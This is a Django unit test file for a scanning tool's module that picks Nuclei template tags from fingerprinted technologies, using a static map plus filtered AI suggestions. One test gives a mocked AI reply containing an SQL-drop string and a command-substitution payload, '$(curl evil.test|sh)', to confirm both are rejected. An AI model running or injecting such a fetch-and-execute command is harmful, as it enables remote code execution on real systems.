from unittest import mock

from django.test import TestCase
from django.utils import timezone

from cveFeed import nuclei_templates as nt
from dashboard.models import Org, Project
from scanEngine.models import EngineType
from startScan.models import ScanHistory, Subdomain, Technology
from targetApp.models import Domain


class StaticTagsTests(TestCase):
	def test_known_technology_names_map_to_tags(self):
		self.assertEqual(nt.static_tags_for(['WordPress', 'nginx']), {'wordpress', 'cms', 'nginx'})
		self.assertEqual(nt.static_tags_for(['Unknown Thing']), set())
		self.assertEqual(nt.static_tags_for([]), set())
		self.assertEqual(nt.static_tags_for([None, '']), set())


class AiTagsTests(TestCase):
	def test_ai_output_is_restricted_to_the_allowed_tag_list_even_if_it_hallucinates(self):
		provider = mock.Mock()
		provider.complete.return_value = '["jenkins", "DROP TABLE users;", "cms", "$(curl evil.test|sh)"]'
		tags = nt.ai_tags_for(['Some Unmapped Build System'], provider)
		self.assertEqual(tags, {'jenkins', 'cms'})  # only values from CANDIDATE_TAGS survive

	def test_ai_is_not_asked_about_names_the_static_table_already_covers(self):
		provider = mock.Mock()
		provider.complete.return_value = '["jenkins"]'
		nt.ai_tags_for(['nginx'], provider)  # nginx is already in STATIC_TAG_MAP
		provider.complete.assert_not_called()

	def test_no_provider_or_nothing_unmapped_returns_empty_without_calling_anything(self):
		self.assertEqual(nt.ai_tags_for(['Jenkins'], None), set())
		provider = mock.Mock()
		self.assertEqual(nt.ai_tags_for(['nginx'], provider), set())
		provider.complete.assert_not_called()

	def test_ai_errors_and_unparseable_replies_degrade_to_empty_not_a_crash(self):
		provider = mock.Mock()
		provider.complete.side_effect = RuntimeError('boom')
		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider), set())
		provider2 = mock.Mock()
		provider2.complete.return_value = 'not json at all'
		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider2), set())


class SelectTagsTests(TestCase):
	def setUp(self):
		org = Org.objects.create(name='T', slug='t-nuclei-tpl')
		self.project = Project.objects.create(name='P', slug='p-nuclei-tpl', insert_date=timezone.now(), org=org)
		self.domain = Domain.objects.create(name='example.test', project=self.project, insert_date=timezone.now())
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		self.scan = ScanHistory.objects.create(domain=self.domain, scan_type=engine, start_scan_date=timezone.now())

	def test_no_subdomains_or_no_technology_gives_no_tags(self):
		self.assertEqual(nt.select_tags(self.scan), set())
		Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		self.assertEqual(nt.select_tags(self.scan), set())

	def test_fingerprinted_technology_maps_to_static_tags_with_ai_disabled(self):
		sub = Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		sub.technologies.add(Technology.objects.create(name='nginx'))
		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=None):
			self.assertEqual(nt.select_tags(self.scan), {'nginx'})

	def test_ai_augments_static_tags_when_configured(self):
		sub = Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		sub.technologies.add(Technology.objects.create(name='nginx'), Technology.objects.create(name='Grafana Labs Custom Build'))
		provider = mock.Mock()
		provider.complete.return_value = '["grafana"]'
		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=provider):
			self.assertEqual(nt.select_tags(self.scan), {'nginx', 'grafana'})
